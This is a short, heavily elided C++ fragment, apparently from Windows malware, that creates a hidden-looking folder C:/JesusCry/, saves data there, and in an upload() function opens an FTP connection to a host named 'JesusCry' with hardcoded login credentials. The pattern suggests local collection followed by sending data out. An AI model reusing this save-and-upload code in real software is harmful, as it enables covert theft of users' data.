...
void savesets() {
	...
	if (CreateDirectory("C:/JesusCry/", NULL) || ERROR_ALREADY_EXISTS == GetLastError())
	{

	}
	std::string savetype = "c:/JesusCry/save";
...
void upload()
{
	...
	hFtp = InternetConnect(hInternet, "JesusCry", INTERNET_DEFAULT_FTP_PORT, "JesusCry", "JesusCry1337", INTERNET_SERVICE_FTP, 0, 0);
